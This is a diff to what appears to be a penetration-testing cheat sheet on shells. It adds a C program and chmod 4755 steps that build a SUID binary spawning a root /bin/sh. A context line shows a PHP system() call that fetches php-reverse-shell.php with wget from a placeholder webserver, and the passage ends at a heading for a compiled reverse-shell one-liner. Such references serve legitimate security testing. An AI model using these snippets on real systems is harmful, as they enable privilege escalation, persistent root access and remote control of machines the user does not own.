@@ -229,7 +229,24 @@ system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php |
 
 #### Binary
 
-###### Compiled one-liner
+###### Linux C binary for SUID shell
+
+The following code can be compiled to get a binary that will spawn a shell with
+out dropping the SID bit. Change the owner of the binary if needed
+`chown root.root suid` and then set the SUID bit and execution mode of the
+compiled binary using `chmod 4755 suid` or `chmod a=srx suid`.  
+
+```
+# gcc -m32 -Wl,--hash-style=both -o suid suid.c
+
+int main(void) {
+    setgid(0);
+		setuid(0);
+    execl("/bin/sh", "sh", 0);
+}
+```
+
+###### Compiled reverse one-liner
 
 If reverse shell must be made through a binary the following c code can be used:
 
